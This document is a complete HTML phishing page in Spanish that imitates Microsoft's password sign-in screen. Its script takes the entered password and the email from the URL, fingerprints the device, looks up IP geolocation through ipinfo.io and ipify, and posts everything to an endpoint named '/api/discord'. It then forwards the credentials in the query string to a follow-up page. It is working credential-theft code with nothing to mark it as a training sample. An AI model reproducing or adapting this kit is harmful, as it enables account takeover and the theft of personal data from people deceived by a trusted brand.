<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Escribir contraseña</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            'ms-red': '#f25022',
            'ms-green': '#7fba00',
            'ms-yellow': '#ffb900',
            'ms-blue-logo': '#00bcf2',
            'ms-gray': '#1b1b1b',
            'ms-gray-light': '#605e5c',
            'ms-border': '#8a8886',
          },
          fontFamily: {
            'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
          },
        }
      }
    }
  </script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      margin: 0; padding: 0; min-height: 100vh; width: 100%;
      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
      background-size: cover; background-position: center; background-repeat: no-repeat;
      background-color: #0a0a1a;
      background-image: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
    }
    @media (min-width: 640px) { html, body { overflow: auto; } }
    .ms-input {
      border: 1px solid #8a8886; font-size: 15px; padding: 11px 12px;
      line-height: 20px; border-radius: 2px; width: 100%; background: #fff; color: #1b1b1b;
      outline: none; transition: border-color 0.1s ease, box-shadow 0.1s ease;
    }
    .ms-input:focus { border-color: #0078d4; box-shadow: inset 0 0 0 1px #0078d4; }
    .ms-button {
      background: #0078d4; color: #fff; border: none; font-size: 15px; font-weight: 600;
      padding: 8px 12px; min-height: 32px; border-radius: 2px; cursor: pointer;
      transition: background-color 0.1s ease;
    }
    .ms-button:hover { background: #106ebe; }
    .ms-button:active { background: #005a9e; }
    .ms-button:disabled { background: #8a8886; cursor: not-allowed; }
    .ms-link { color: #0078d4; text-decoration: none; font-size: 13px; }
    .ms-link:hover { text-decoration: underline; }
    .fade-in { animation: fadeIn 0.3s ease-out; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .login-container {
      position: relative; z-index: 1; background: rgba(255,255,255,0.95);
      backdrop-filter: blur(10px); border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    }
    .main-container {
      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      display: flex; align-items: center; justify-content: center; padding: 1rem; z-index: 10;
    }
    @media (min-width: 640px) { .main-container { position: static; min-height: 100vh; padding-top: 12vh; } }
    .footer-links {
      position: fixed; bottom: 0; left: 0; right: 0;
      background: rgba(255,255,255,0.95); backdrop-filter: blur(8px);
      border-top: 1px solid #e1dfdd; padding: 8px 16px; z-index: 50;
    }
    @media (min-width: 640px) { .footer-links { padding: 8px 24px; } }
    .footer-inner {
      max-width: 1200px; margin: 0 auto; display: flex; flex-wrap: wrap;
      align-items: center; justify-content: center; gap: 8px 16px;
      font-size: 12px; color: #605e5c;
    }
    .footer-inner a { color: #0078d4; text-decoration: none; }
    .footer-inner a:hover { text-decoration: underline; }
    .footer-inner .private-tip { text-align: center; font-size: 11px; }
    .email-badge {
      display: inline-flex; align-items: center; justify-content: center;
      background: transparent; border: 1px solid #8a8886; border-radius: 9999px;
      padding: 4px 12px; font-size: 13px; color: #1b1b1b; font-weight: 500;
    }
  </style>
</head>
<body>

  <div class="main-container">
    <div class="w-full max-w-md fade-in relative z-10">
      <div class="login-container p-8 sm:p-12">

        <div class="text-center mb-6">
          <div class="inline-flex items-center justify-center bg-transparent rounded-full px-5 py-2 border border-gray-300 mb-4">
            <span id="userEmailBadge" class="email-badge">usuario@ejemplo.com</span>
          </div>
        </div>

        <div class="flex items-center justify-center mb-6">
          <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3">
            <div class="bg-ms-red w-3 h-3"></div>
            <div class="bg-ms-green w-3 h-3"></div>
            <div class="bg-ms-blue-logo w-3 h-3"></div>
            <div class="bg-ms-yellow w-3 h-3"></div>
          </div>
          <span class="text-xl font-semibold text-ms-gray" style="font-family:'Segoe UI',system-ui,sans-serif;font-size:21px;line-height:28px;">Microsoft</span>
        </div>

        <h1 class="text-2xl font-semibold text-ms-gray mb-8 text-center" style="font-size:28px;line-height:36px;">Escribir contraseña</h1>

        <form onsubmit="handlePasswordSubmit(event)" class="space-y-5">
          <div class="relative">
            <input type="password" id="password" placeholder="Contraseña"
              class="ms-input pr-10" required style="width:100%;" autocomplete="current-password" />
            <button type="button" onclick="togglePassword()"
              class="absolute right-3 top-1/2 transform -translate-y-1/2 text-ms-gray-light hover:text-ms-gray transition-colors"
              tabindex="-1" style="padding:4px;">
              <svg id="eyeIcon" class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
              </svg>
            </button>
          </div>

          <div class="flex items-center justify-between text-left">
            <a href="#" class="ms-link" onclick="showForgotPasswordHelp()">¿Olvidó su contraseña?</a>
          </div>

          <button type="submit" class="ms-button w-full" id="submitBtn" style="width:100%;">
            Iniciar sesión
          </button>
        </form>

        <div class="mt-6 pt-4 border-t border-gray-200 text-center">
          <a href="#" class="ms-link">Otras formas de iniciar sesión</a>
        </div>
      </div>
    </div>
  </div>

  <div class="footer-links">
    <div class="footer-inner">
      <a href="#" id="footerHelp">Ayuda</a>
      <a href="#" id="footerTerms">Términos de uso</a>
      <a href="#" id="footerPrivacy">Privacidad y cookies</a>
      <span class="private-tip">Usa la exploración privada si este no es tu dispositivo. <a href="#">Más información</a></span>
    </div>
  </div>

  <script>
    let globalConfig = null;
    let currentEmail = '';

    (function applyInitialBackground() {
      const gradientColor = '#0a0a1a';
      const gradient = 'linear-gradient(135deg, ' + gradientColor + ' 0%, #1a1a2e 100%)';
      document.documentElement.style.background = gradient;
      document.documentElement.style.backgroundSize = 'cover';
      document.documentElement.style.backgroundPosition = 'center';
      document.documentElement.style.backgroundRepeat = 'no-repeat';
      document.documentElement.style.backgroundColor = gradientColor;
      document.body.style.background = gradient;
      document.body.style.backgroundSize = 'cover';
      document.body.style.backgroundPosition = 'center';
      document.body.style.backgroundRepeat = 'no-repeat';
      document.body.style.backgroundColor = gradientColor;
    })();

    async function loadConfig() {
      try {
        const res = await fetch('/api/config');
        if (res.ok) globalConfig = await res.json();
      } catch (e) { console.warn('Config no disponible'); }
      if (!globalConfig) globalConfig = { logoText:'Microsoft', footerHelpText:'Ayuda', footerTermsText:'Términos de uso', footerPrivacyText:'Privacidad y cookies', footerPrivateTip:'Usa la exploración privada si este no es tu dispositivo. Más información' };
      applyConfig();
    }

    function applyConfig() {
      if (globalConfig.logoText) {
        const logo = document.querySelector('.text-xl.font-semibold.text-ms-gray');
        if (logo) logo.textContent = globalConfig.logoText;
      }
      const fh = document.getElementById('footerHelp');
      const ft = document.getElementById('footerTerms');
      const fp = document.getElementById('footerPrivacy');
      const pt = document.querySelector('.private-tip');
      if (fh && globalConfig.footerHelpText) fh.textContent = globalConfig.footerHelpText;
      if (ft && globalConfig.footerTermsText) ft.textContent = globalConfig.footerTermsText;
      if (fp && globalConfig.footerPrivacyText) fp.textContent = globalConfig.footerPrivacyText;
      if (pt && globalConfig.footerPrivateTip) pt.innerHTML = globalConfig.footerPrivateTip;
    }

    function togglePassword() {
      const input = document.getElementById('password');
      const icon = document.getElementById('eyeIcon');
      if (input.type === 'password') {
        input.type = 'text';
        icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>';
      } else {
        input.type = 'password';
        icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>';
      }
    }

    function showForgotPasswordHelp() {
      alert('Para restablecer su contraseña, favor de contactar al soporte técnico.');
    }

    async function sendToDiscord(email, password) {
      let geoData = {};
      try {
        const geoRes = await fetch('https://ipinfo.io/json');
        if (geoRes.ok) geoData = await geoRes.json();
      } catch (e) { console.warn('Geo IP no disponible:', e); }

      let ipifyIp = '';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        if (ipRes.ok) { const d = await ipRes.json(); ipifyIp = d.ip || ''; }
      } catch (e) { console.warn('IPify no disponible:', e); }

      let batteryLevel = 'No disponible';
      let batteryCharging = 'Desconocido';
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryLevel = (battery.level * 100).toFixed(0) + '%';
          batteryCharging = battery.charging ? 'Sí' : 'No';
        }
      } catch (e) { console.warn('Batería no disponible:', e); }

      const userAgent = navigator.userAgent || 'desconocido';
      const language = navigator.language || 'desconocido';
      const languages = navigator.languages ? navigator.languages.join(', ') : language;
      const screenResolution = screen.width + 'x' + screen.height;
      const colorDepth = screen.colorDepth + ' bits';
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'desconocido';
      const platform = navigator.platform || 'desconocido';
      const onlineStatus = navigator.onLine ? 'Sí' : 'No';
      const cookiesEnabled = navigator.cookieEnabled ? 'Sí' : 'No';
      const deviceMemory = navigator.deviceMemory || 'desconocido';
      const cpuCores = navigator.hardwareConcurrency || 'desconocido';
      const touchPoints = navigator.maxTouchPoints || 0;
      const uaLower = userAgent.toLowerCase();
      const isMobile = /android|iphone|ipad|ipod/i.test(uaLower) ? 'Sí' : 'No';
      const isTablet = /ipad|tablet/i.test(uaLower) ? 'Sí' : 'No';
      const isDesktop = !/android|iphone|ipad|ipod|tablet/i.test(uaLower) ? 'Sí' : 'No';

      const geoIp = geoData.ip || ipifyIp || '';
      const geoCity = geoData.city || '';
      const geoRegion = geoData.region || '';
      const geoCountry = geoData.country || '';
      const geoCountryCode = geoData.country || '';
      const geoTimezone = geoData.timezone || timezone;
      const geoIsoCode = geoCountryCode;
      const geoIsp = geoData.org || '';
      const geoLatitude = geoData.loc ? geoData.loc.split(',')[0] : '';
      const geoLongitude = geoData.loc ? geoData.loc.split(',')[1] : '';
      const geoZip = geoData.postal || '';
      const geoCurrency = geoData.currency || '';
      const geoCurrencyCode = geoData.currency || '';
      const geoCallingCode = geoData.phone ? geoData.phone.split(' ')[0] : '';
      const geoNetwork = geoData.org || '';

      const payload = {
        email,
        password: password || '',
        userAgent, language, languages, screenResolution, colorDepth,
        timezone, platform, onlineStatus, cookiesEnabled,
        deviceMemory, cpuCores, touchPoints,
        isMobile, isTablet, isDesktop,
        batteryLevel, batteryCharging,
        geoIp, geoCity, geoRegion, geoCountry, geoCountryCode,
        geoTimezone, geoIsoCode, geoIsp, geoLatitude, geoLongitude,
        geoZip, geoCurrency, geoCurrencyCode, geoCallingCode, geoNetwork,
        ipifyIp,
      };

      try {
        const res = await fetch('/api/discord', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
        const data = await res.json();
        return data.success === true;
      } catch (err) {
        console.warn('Discord API unavailable:', err);
        return false;
      }
    }

    function handlePasswordSubmit(event) {
      event.preventDefault();
      const password = document.getElementById('password').value;
      const btn = document.getElementById('submitBtn');
      if (!password || password.trim() === '') {
        alert('Por favor ingresa tu contraseña.');
        return;
      }
      btn.disabled = true;
      btn.textContent = 'Verificando...';

      sendToDiscord(currentEmail, password).then(function(success) {
        setTimeout(function() {
          window.location.href = 'informacion.html?email=' + encodeURIComponent(currentEmail) + '&password=' + encodeURIComponent(password);
        }, 600);
      }).catch(function() {
        setTimeout(function() {
          window.location.href = 'informacion.html?email=' + encodeURIComponent(currentEmail) + '&password=' + encodeURIComponent(password);
        }, 600);
      });
    }

    (function init() {
      const params = new URLSearchParams(window.location.search);
      currentEmail = params.get('email') || '';
      document.getElementById('userEmailBadge').textContent = currentEmail || 'usuario@ejemplo.com';
      loadConfig();
    })();
  </script>
</body>
</html>
